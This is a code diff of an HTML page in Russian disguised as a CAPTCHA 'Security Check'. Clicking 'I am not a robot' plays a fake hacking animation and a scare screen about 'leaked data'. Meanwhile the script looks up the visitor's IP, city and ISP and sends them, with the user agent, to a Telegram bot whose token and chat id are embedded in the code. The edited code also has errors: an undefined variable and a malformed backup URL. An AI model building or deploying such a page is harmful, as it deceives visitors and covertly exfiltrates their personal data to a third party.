@@ -4,21 +4,20 @@
     <meta charset="UTF-8">
     <title>Security Check</title>
     <style>
-        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; overflow-x: hidden; }
+        body { background: #000; margin: 0; color: #0f0; font-family: 'Courier New', monospace; font-size: 13px; }
         #captcha-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #fff; color: #000; }
         .btn-verify { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 20px; }
-        #terminal { display: none; padding: 20px; line-height: 1.2; height: 100vh; }
+        #terminal { display: none; padding: 20px; line-height: 1.4; height: 100vh; overflow: hidden; }
         #leak-box { display: none; padding: 20px; }
         .danger-ui { border: 2px solid red; padding: 20px; margin: 20px auto; max-width: 600px; background: rgba(255, 0, 0, 0.1); }
         .red-text { color: red; text-align: center; font-weight: bold; font-size: 22px; }
-        .t-red { color: red; } .t-gold { color: gold; }
+        hr { border: 0; border-top: 2px solid red; margin: 15px 0; }
     </style>
 </head>
 <body>
     <div id="terminal"></div>
 
     <div id="captcha-box">
-         
         <img src="https://www.gstatic.com" width="80">
         <h2>Подтвердите, что вы не робот</h2>
         <button class="btn-verify" onclick="startHack()">Я не робот</button>
@@ -27,11 +26,11 @@
     <div id="leak-box">
         <div class="danger-ui">
             <p class="red-text">⚠ ДАННЫЕ УТЕЧКИ ⚠</p>
-            <hr color="red">
+            <hr>
             <p>> Статус: <span style="color:red; font-weight:bold;">КРИТИЧЕСКАЯ УЯЗВИМОСТЬ</span></p>
-            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">Определение...</span></p>
-            <p>> Город: <span id="user-geo" style="color:#fff;">Поиск...</span></p>
-            <p>> Устройство: <span id="user-os" style="color:#fff;">Загрузка...</span></p>
+            <p>> IP-адрес: <span id="user-ip" style="color:#fff;">...</span></p>
+            <p>> Город: <span id="user-geo" style="color:#fff;">...</span></p>
+            <p>> Устройство: <span id="user-os" style="color:#fff;">...</span></p>
             <p style="color: red; margin-top: 20px;">⚡ СКОПИРОВАННЫЕ ДАННЫЕ:</p>
             <ul style="color: #ff4d4d;">
                 <li>История браузера: извлечена (2,431 запись)</li>
@@ -41,40 +40,66 @@
         </div>
     </div>
 
-        <script>
+    <script>
         const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
         const chat_id = "-1003861311533";
 
         async function startHack() {
-    
+     
             document.getElementById('captcha-box').style.display = 'none';
-            document.getElementById('leak-box').style.display = 'block';
+            const term = document.getElementById('terminal');
+            term.style.display = 'block';
 
+            const lines = [
+                "> [INIT] Инициализация взлома...",
+                "> [INFO] Обход reCAPTCHA v2... [OK]",
+                "> [SYSTEM] Поиск уязвимостей...",
+                "> [CRITICAL] Доступ к ядру получен",
+                "> [INFO] Извлечение базы паролей...",
+                "> [INFO] Копирование медиафайлов...",
+                "> [ALERT] Сжатие данных. Отправка..."
+            ];
+
+        
+            for (let line of lines) {
+                let p = document.createElement('p');
+                p.innerText = line;
+                term.appendChild(p);
+                window.scrollTo(0, document.body.scrollHeight);
+                await new Promise(r => setTimeout(r, 200)); 
+            }
+
+        
+            await sendFullLogs();
+
+     
+            term.style.display = 'none';
+            document.getElementById('leak-box').style.display = 'block';
+        }
+
+        async function sendFullLogs() {
             try {
-                
                 const res = await fetch('https://ipwho.is/');
                 const d = await res.json();
- 
-                if (document.getElementById('user-ip')) document.getElementById('user-ip').innerText = d.ip;
-                if (document.getElementById('user-geo')) document.getElementById('user-geo').innerText = d.city;
-                if (document.getElementById('user-os')) document.getElementById('user-os').innerText = navigator.platform;
-
                 
-                const report = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n🏢 Провайдер: ${d.connection.org}\n📱 Устройство: ${navigator.userAgent}`;
+   
+                const ip = d.ip || "Не определен";
+                const city = d.city || "Не определен";
+                const org = (d.connection && d.connection.org) ? d.connection.org : "Не определен";
 
-               
+                document.getElementById('user-ip').innerText = ip;
+                document.getElementById('user-geo').innerText = city;
+                document.getElementById('user-os').innerText = navigator.platform;
+
+                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n🏢 Провайдер: ${org}\n📱 Устройство: ${navigator.userAgent}`;
+                
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
 
             } catch (e) {
-                 
                 const backup = `⚠️ Переход (Ошибка IP)!\n📱 ${navigator.userAgent}\n❌ Ошибка: ${e.message}`;
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
-                
-                 
-                console.error("Ошибка в коде:", e);
+                fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(backup)}`);
             }
         }
     </script>
-
 </body>
 </html>
